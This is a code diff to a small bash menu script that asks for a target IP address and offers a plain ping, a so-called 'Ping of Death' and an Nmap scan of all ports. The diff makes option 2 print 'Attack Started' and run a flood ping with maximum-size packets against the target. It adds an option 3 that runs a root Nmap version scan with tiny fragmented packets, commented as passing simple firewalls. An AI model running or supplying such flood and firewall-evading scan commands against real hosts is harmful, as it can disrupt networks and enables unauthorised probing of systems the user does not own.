@@ -35,6 +35,7 @@ echo "[2] Ping of Death"
 echo "[3] Nmap All Port Scan"
 echo ""
 }
+
 #Ping Scan
 read -p "Enter the IP address: " Ipaddress
 menu
@@ -45,8 +46,11 @@ read -p "Choose an option: " option
 		ping $Ipaddress                #Simple Ping
 	elif [[ $option == 2 ]]
 	then	
-		ping $Ipaddress -s 65507       #Ping of Death
-	else 
+		printf "\e[1;41m\e[41m Attack Started \e[0m\n"
+		echo ""
+		ping $Ipaddress -s 65507 -f -i 0.2
+	elif [[ $option == 3 ]]
+	then
 		printf "\e[1;41m\e[41m I need root Privileges for this Option \e[0m\n"
 		sudo nmap -vv -sV --mtu 24 -p- $Ipaddress          #Nmap Ping Scan(passes simple firewalls)
 	fi 
